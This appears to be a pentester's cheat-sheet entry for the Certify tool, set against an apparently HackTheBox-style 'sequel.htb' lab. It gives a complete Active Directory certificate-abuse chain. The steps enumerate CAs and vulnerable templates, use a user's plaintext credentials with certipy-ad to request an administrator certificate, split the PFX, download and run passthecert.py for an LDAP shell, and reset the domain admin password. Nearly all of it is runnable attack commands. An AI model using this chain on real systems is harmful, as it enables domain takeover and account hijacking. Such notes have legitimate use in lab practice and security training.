# Name
Certify

## Usage
```
# Find Certificate Authorities:
.\Certify.exe cas

# Identify Vulnerable Template:
.\Certify.exe find /vulnerable

# Use certipy-ad to request a certificate for domain admin:
certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -dc-ip 10.10.11.202

# Separate administrator.pfx into key and certificate files:
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt

# Passthecert using ldap-shell
wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py
python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain sequel.htb -dc-ip 10.10.11.202
whoami
change_password administrator P@ssw0rd123!
```

## Source
https://github.com/GhostPack/Certify
